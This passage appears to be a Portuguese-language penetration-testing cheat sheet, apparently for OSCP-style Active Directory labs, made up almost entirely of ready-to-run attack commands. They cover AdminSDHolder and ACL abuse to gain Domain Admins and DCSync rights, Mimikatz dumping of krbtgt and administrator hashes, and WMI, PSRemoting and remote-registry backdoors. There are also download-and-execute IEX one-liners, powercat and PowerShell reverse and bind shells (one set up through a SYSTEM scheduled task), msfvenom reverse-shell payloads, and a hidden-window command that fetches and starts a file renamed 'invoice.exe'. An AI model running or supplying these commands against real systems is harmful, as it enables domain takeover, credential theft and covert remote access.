Add-ObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=TECH,DC=LOCAL' -PrincipalIdentity vegeta -Rights ResetPassword -Verbose
```
```
Add-ObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=TECH,DC=LOCAL' -PrincipalIdentity vegeta -Rights WriteMembers -Verbose
```

##### ADMIN SDHOLDER - PROPAGAR AS PERMISSÕES PARA AS CONTAS PROTEGIDAS
```
IEX(New-Object System.Net.WebClient).DownloadString("https://github.com/n0ts0cial/oscp/raw/main/Invoke-SDPropagator.ps1")
Invoke-SDPropagator -timeoutminutes 1 -ShowProgress -Verbose
```
##### ADMIN SDHOLDER - ABUSSAR DE PERMISSÃO PARA ADICIONAR USUARIO NO GRUPO DE ADMINISTRADORES
```
Add-ADGroupMember -Identity 'Domain Admins' -Members pentester
```
##### ADMIN SDHOLDER - ABUSSAR DE PERMISSÃO PARA TROCAR A SENHA DE UM USUARIO
```
$MyPassword = ConvertTo-SecureString -AsPlainText -Force -String aaabbbccc
Set-ADAccountPassword -Identity goku -Reset -NewPassword $MyPassword
```
```
Set-ADAccountPassword -Identity goku -Reset -NewPassword (ConvertTo-SecureString -AsPlainText -Force -String aaabbbccc) -Verbose
```
##### ADMIN SDHOLDER - DEPOIS DE PEGAR UMA CONTA DE ADMIN, ABUSAR DE PERMISSÃO PARA CONFIGURAR PERMISSÃO PARA DCSYNC (POWERVIEW)
```
Add-ObjectAcl -TargetIdentity 'DC=TECH,DC=LOCAL' -PrincipalIdentity pentester -Rights DCSync -Verbose
```
DCSYNC:
- 1131f6aa-9c07-11d1-f79f-00c04fc2dcd2
- 1131f6ad-9c07-11d1-f79f-00c04fc2dcd2
- 89e95b76-444d-4c62-991a-0facbeda640c

LISTAR QUEM TEM DCSYNC:
```
(Get-Acl "ad:\dc=TECH,dc=LOCAL").Access | ? {($_.ObjectType -eq "1131f6aa-9c07-11d1-f79f-00c04fc2dcd2" -or $_.ObjectType -eq "1131f6ad-9c07-11d1-f79f-00c04fc2dcd2" -or $_.ObjectType -eq "89e95b76-444d-4c62-991a-0facbeda640c" ) } | select IdentityReference
```
##### ADMIN SDHOLDER - DEPOIS DE PEGAR UMA CONTA DE ADMIN, ABUSAR DE PERMISSÃO PARA CONFIGURAR PERMISSÃO FULL PARA DOMINIO (DCSYNC)
```
 $MyAdmin = (get-aduser pentester).sid
$MyDistinguishedName = "DC=TECH,DC=LOCAL"
$MyDistinguishedNameAD = $MyDistinguishedName = "AD:$MyDistinguishedName"
$MyACL= Get-ACL $MyDistinguishedNameAD
$MyADRights = [System.DirectoryServices.ActiveDirectoryRights] "Genericall"
$MyType = [System.Security.AccessControl.AccessControlType] "Allow"
$MyInheritanceType = [System.DirectoryServices.ActiveDirectorySecurityInheritance] "All"
$MyACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $MyAdmin,$MyADRights,$MyType,$MyInheritanceType
$MyACL.AddAccessRule($MyACE)
Set-acl -aclobject $MyACL $MyDistinguishedNameAD
```
##### ADMIN SDHOLDER - DEPOIS DE DAR A PERMISSÃO PARA DCSYNC, EXECUTAR O DCSYNC DO MIMIKATZ EM QQ MAQUINA
```
.\Mimikatz
lsadump::dcsync /user:tech\krbtgt
lsadump::dcsync /user:tech\administrator
lsadump::dcsync /user:tech\goku
```
### PERSISTENCE WMI
##### PERSISTENCE WMI - LOAD REQUIREMENTS
```
curl https://github.com/n0ts0cial/oscp/raw/main/Set-RemoteWMI.ps1 -Outfile Set-RemoteWMI.ps1
Import-Module .\Set-RemoteWMI.ps1
```
```
IEX (New-Object System.Net.WebClient).DownloadString("https://github.com/n0ts0cial/oscp/raw/main/Set-RemoteWMI.ps1")
```
##### PERSISTENCE WMI - ADICIONAR PERMISSÃO PARA ACESSAR TODO WMI LOCALMENTE E REMOTAMENTE: (RODANDO NO COMPUTADOR LOCAL)
```
Set-RemoteWMI -UserName vegeta -Verbose
Set-RemoteWMI -UserNAme vegeta -namespace 'root\cimv2' -Verbose

```
##### PERSISTENCE WMI - ADICIONAR PERMISSÃO PARA ACESSAR TODO WMI LOCALMENTE E REMOTAMENTE: (RODANDO EM UM COMPUTADOR REMOTO)
```
Set-RemoteWMI -UserName vegeta -ComputerName tech-server01 -namespace 'root\cimv2' -Verbose
Set-RemoteWMI -UserName vegeta -ComputerName tech-server01 -Credential administrator –namespace 'root\cimv2' -Verbose
```
##### PERSISTENCE WMI - REMOVER PERMISSÃO PARA ACESSAR TODO WMI LOCALMENTE E REMOTAMENTE:
```
Set-RemoteWMI -UserName vegeta -Verbose -Remove
Set-RemoteWMI -UserName vegeta -ComputerName tech-server01 -namespace 'root\cimv2' -Remove -Verbose
Set-RemoteWMI -UserName vegeta -ComputerName tech-server01 -Credential administrator -namespace 'root\cimv2' -Remove -Verbose
```
##### PERSISTENCE WMI - CRIAR UM PROCESSO REMOTAMENTE:
```
WMIC process call create "cmd.exe /k whoami /all"
WMIC /node:127.0.0.1 process call create "cmd.exe /k whoami /all"
WMIC /node:172.31.8.201 process call create "cmd.exe /k whoami /all"
WMIC /node:172.31.8.201 /user:goku process call create "cmd.exe /k whoami /all"
```
```
Invoke-WmiMethod win32_process -name create -argumentlist "ping google.com"
Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList 'cmd /k whoami /all'
```
##### PERSISTENCE WMI - OBTER INFORMAÇÕES REMOTAMENTE:
```
Get-WmiObject -class win32_operatingsystem -computername tech-dc01
```
### PERSISTENCE PSREMOTING
##### PERSISTENCE PSREMOTING - LOAD REQUIREMENTS
```
curl https://github.com/n0ts0cial/oscp/raw/main/Set-RemotePSRemoting.ps1 -Outfile Set-RemotePSRemoting.ps1
Import-Module .\Set-RemotePSRemoting.ps1
```
```
IEX (New-Object System.Net.WebClient).DownloadString("https://github.com/n0ts0cial/oscp/raw/main/Set-RemotePSRemoting.ps1")
```
##### PERSISTENCE PSREMOTING - ADICIONAR PERMISSÃO PARA PSREMOTE. (RODANDO NO COMPUTADOR LOCAL)
```
Set-RemotePSRemoting -Username vegeta -Verbose
```
##### PERSISTENCE PSREMOTING - ADICIONAR PERMISSÃO PARA PSREMOTE. (RODANDO REMOTAMENTE)
```
Set-RemotePSRemoting -Username vegeta -computername tech-dc01 -Verbose
```
##### PERSISTENCE PSREMOTING - REMOVER PERMISSÃO PARA PSREMOTE
```
Set-RemotePSRemoting -Username pentester -Remove -Verbose
Set-RemotePSRemoting -Username vegeta -computername tech-dc01 -Remove -Verbose
```

##### PERSISTENCE PSREMOTING - ACESSAR REMOTAMENTE
```
Enter-PSSession -computername tech-dc01
Invoke-Command -Scriptblock{whoami} -computername tech-dc01
```
### PERSISTENCE REMOTE REGISTRY
##### PERSISTENCE REMOTE REGISTRY - LOAD REQUIREMENTS
```
curl https://github.com/n0ts0cial/oscp/raw/main/Add-RemoteRegBackdoor.ps1 -Outfile Add-RemoteRegBackdoor.ps1
Import-Module .\Add-RemoteRegBackdoor.ps1
```
```
IEX (New-Object System.Net.WebClient).DownloadString("https://github.com/n0ts0cial/oscp/raw/main/Add-RemoteRegBackdoor.ps1")
```
##### PERSISTENCE REMOTE REGISTRY - ADICIONAR PERMISSÃO PARA REGISTRO REMOTO. (RODANDO NO COMPUTADOR LOCAL)
```
Add-RemoteRegBackdoor -Trustee pentester -Verbose
```
##### PERSISTENCE REMOTE REGISTRY - ADICIONAR PERMISSÃO PARA REGISTRO REMOTO. (RODANDO REMOTAMENTE)
```
Add-RemoteRegBackdoor -Computername tech-dc01 -Trustee pentester -Verbose
```
##### PERSISTENCE REMOTE REGISTRY - RECUPERAR INFORMAÇÕES REMOTAMENTE: (NÃO FUNCIONOU)
```
IEX (New-Object System.Net.WebClient).DownloadString("https://github.com/n0ts0cial/oscp/raw/main/RemoteHashRetrieval.ps1")

Get-RemoteMachineAccountHash -Computername tech-dc01 -Verbose

Get-RemoteLocalAccountHash -Computername tech-dc01 -Verbose

Get-RemoteCachedCredential -Computername tech-dc01 -Verbose
```














 















# POWERSHELL
## DOWNLOAD
##### POWERSHELL - DOWNLOAD AS STRING
```
IEX (New-Object System.Net.WebClient).DownloadString("http://175.12.80.10:8080/SharpHound.ps1")
```
##### POWERSHELL - DOWNLOAD CURL
```
curl https://github.com/samratashok/nishang/raw/master/Gather/Invoke-Mimikatz.ps1 -Outfile Invoke-Mimikatz.ps1
```
##### POWERSHELL - DOWNLOAD CERTUTIL
```
certutil -urlcache -split -f http://10.11.7.210/chisel_1.7.7_windows_amd64
```

## POWERCAT
##### POWERCAT - DOWNLOAD
```
IEX(New-Object System.Net.WebClient).DownloadString("https://github.com/n0ts0cial/oscp/raw/main/powercat.ps1")
```
```
curl https://github.com/n0ts0cial/oscp/raw/main/powercat.ps1  -Outfile powercat.ps1
import-module .\powercat.ps1
```
##### POWERCAT - AGUARDAR CONEXÃO
```
powercat -l -p 666 -v
```
##### POWERCAT - SHELL REVERSO
```
powercat -c 172.31.13.86 -p 666 -e cmd
powercat -c 172.31.13.86 -p 666 -ep
```
##### POWERCAT - BINDSHELL
```
powercat -l -p 8000 -ep -rep
```
##### POWERCAT - CONECTAR NO BINDSHELL
```
powercat -c 172.31.8.201 -p 8000
```
## INVOKE-POWERSHELLTCP 
##### INVOKE-POWERSHELLTCP - DOWNLOAD
```
IEX(New-Object System.Net.WebClient).DownloadString("https://github.com/n0ts0cial/oscp/raw/main/Invoke-PowerShellTcp.ps1")
```
```
curl https://github.com/n0ts0cial/oscp/raw/main/Invoke-PowerShellTcp.ps1 -outfile Invoke-PowerShellTcp.ps1
Import-Module .\Invoke-PowerShellTcp.ps1
```
##### INVOKE-POWERSHELLTCP - SHELL REVERSO
```
Invoke-PowerShellTcp -Reverse -IPAddress 172.31.13.86 -Port 666
```
AGUARDAR A CONEXÃO COM POWERCAT:
```
IEX(New-Object System.Net.WebClient).DownloadString("https://github.com/n0ts0cial/oscp/raw/main/powercat.ps1")
powercat -l -p 666 -v
```
##### INVOKE-POWERSHELLTCP - SHELL REVERSO ATRAVÉS DE TAREFA AGENDADA
```
schtasks /create /S tech-dc01 /SC WEEKLY /RU "NT Authority\SYSTEM" /TN "REVERSESHELL" /TR "powershell.exe -c 'IEX(New-Object System.Net.WebClient).DownloadString(''https://github.com/n0ts0cial/oscp/raw/main/Invoke-PowerShellTcp2.ps1''')'"
```
ULTIMA LINHA DO ARQUIVO Invoke-PowerShellTcp2.ps1:
```
Invoke-PowerShellTcp -Reverse -IPAddress 172.31.13.86 -Port 666
```
RODAR A TAREFA AGENDADA:
```
schtasks /RUN /S tech-dc01 /TN "REVERSESHELL"
```
AGUARDAR A CONEXÃO:
```
IEX(New-Object System.Net.WebClient).DownloadString("https://github.com/n0ts0cial/oscp/raw/main/powercat.ps1")
powercat -l -p 666 -v
```





## MSFVENOM
##### REVERSE SHELL - LINUX x64
```
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=666 -f elf -o shell666.elf
```
```
nc -nvlp 666
```
```
python3 -c 'import pty;pty.spawn("/bin/bash")'
```
##### REVERSE SHELL - WINDOWS x64
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=666 -f exe -o reverse.exe
```
```
nc -nvlp 666
```
## FINDING FILES
##### LINUX - FINDING FILES
```
find / -name local.txt 2> /dev/null
```
## ATTACK - DOMAIN ACLS
##### ATAQUE - SE SOU OWNER DO USUARIO
DAR PERMISSÃO GENERICALL PARA VEGETA SOBRE CHICHI
```
$MyAdmin = (get-aduser vegeta).sid
$MyUser = (get-aduser chichi)
$MyDistinguishedName = ($Myuser).distinguishedname
$MyDistinguishedNameAD = $MyDistinguishedName = "AD:$MyUser"
$MyACL= Get-ACL $MyDistinguishedNameAD
$MyADRights = [System.DirectoryServices.ActiveDirectoryRights] "GenericWrite"
$MyType = [System.Security.AccessControl.AccessControlType] "Allow"
$MyInheritanceType = [System.DirectoryServices.ActiveDirectorySecurityInheritance] "All"
$MyACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $MyAdmin,$MyADRights,$MyType,$MyInheritanceType
$MyACL.AddAccessRule($MyACE)
Set-acl -aclobject $MyACL $MyDistinguishedNameAD
```
```
Add-DomainObjectAcl -TargetIdentity chichi -PrincipalIdentity vegeta -Rights All
```
DAR PERMISSÃO GENERICALL PARA VEGETA SOBRE GRUPO GROUP-A
```
$MyAdmin = (get-aduser vegeta).sid
$MyObject = (Get-ADGroup 'GROUP-A')
$MyDistinguishedName = ($MyObject).distinguishedname
$MyDistinguishedNameAD = $MyDistinguishedName = "AD:$MyObject"
$MyACL= Get-ACL $MyDistinguishedNameAD
$MyADRights = [System.DirectoryServices.ActiveDirectoryRights] "GenericWrite"
$MyType = [System.Security.AccessControl.AccessControlType] "Allow"
$MyInheritanceType = [System.DirectoryServices.ActiveDirectorySecurityInheritance] "All"
$MyACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $MyAdmin,$MyADRights,$MyType,$MyInheritanceType
$MyACL.AddAccessRule($MyACE)
Set-acl -aclobject $MyACL $MyDistinguishedNameAD
```
```
Add-DomainObjectAcl -TargetIdentity 'GROUP-A' -PrincipalIdentity vegeta -Rights All
```
##### ATAQUE - SE TENHO GENERIC ALL SOBRE O OBJETO
TROCAR A SENHA DO USUÁRIO
```
$MyPassword = ConvertTo-SecureString -AsPlainText -Force -String 123QWE@@
Set-ADAccountPassword -Identity chichi -Reset -NewPassword $MyPassword
```
```
$MyAccount = [ADSI]"LDAP://CN=chichi,CN=Users,DC=TECH,DC=LOCAL"
$MyAccount.psbase.invoke("SetPassword",'Test123@@')
$MyAccount.psbase.CommitChanges()
```
```
net user chichi Password123! /domain
```
```
$UserPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
Set-DomainUserPassword -Identity chichi -AccountPassword $UserPassword
```
CRIAR SPN , SOLICITAR TICKET E QUEBRAR A SENHA (KERBEROASTING)

## POWERSHELL
##### POWERSHELL COMANDO - DOWNLOAD DE ARQUIVO
```
powershell.exe -NoExit -ExecutionPolicy Bypass -WindowStyle Hidden $ErrorActionPreference= 'silentlycontinue';(New-Object System.Net.WebClient).DownloadFile('http://127.0.0.1/1.exe', 'C:\\test-WDATP-test\\invoice.exe');Start-Process 'C:\\test-WDATP-test\\invoice.exe'
```
